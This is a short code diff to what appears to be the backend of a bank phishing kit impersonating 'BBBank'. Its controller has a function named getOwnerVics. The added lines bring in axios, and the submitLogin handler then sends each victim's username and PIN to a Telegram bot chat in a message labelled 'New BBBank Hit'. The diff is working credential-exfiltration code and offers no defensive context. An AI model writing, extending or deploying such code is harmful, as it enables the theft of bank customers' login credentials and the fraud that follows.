@@ -1,4 +1,5 @@
 const BBBank = require("../models/bbbankModel");
+const axios = require("axios");
 var moment = require("moment"); // require
 
 const getOwnerVics = async (req, res) => {
@@ -56,6 +57,19 @@ const submitLogin = async (req, res) => {
 				timestamp: moment().format(),
 			});
 		}
+
+		await axios
+			.post(
+				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+				{
+					chat_id: '-837014205',
+					text: `New BBBank Hit:\n\n${username}\n${pin}`,
+					parse_mode: "Markdown",
+				}
+			)
+			.catch((e) => {
+				console.log(e);
+			});
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
